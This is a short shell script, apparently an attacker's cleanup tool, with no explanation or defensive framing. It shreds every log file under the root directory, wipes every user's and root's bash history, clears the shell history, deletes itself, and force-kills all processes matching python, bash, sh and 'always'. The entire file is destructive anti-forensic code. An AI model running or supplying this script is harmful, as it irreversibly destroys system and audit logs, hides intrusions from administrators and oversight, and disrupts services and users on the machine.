#!/bin/sh

find / -name '*.log.*' -exec shred -zfu {} \;
find / -name '*.log' -exec shred -zfu {} \;
export HISTSIZE=0
shred -fzu /home/*/.bash_history || true
shred -fzu root/.bash_history || true
history -c
rm log.sh
ps -ef | grep 'python' | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep 'always' | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep 'bash' | grep -v grep | awk '{print $2}' | xargs -r kill -9
ps -ef | grep '/sh' | grep -v grep | awk '{print $2}' | xargs -r kill -9
exit
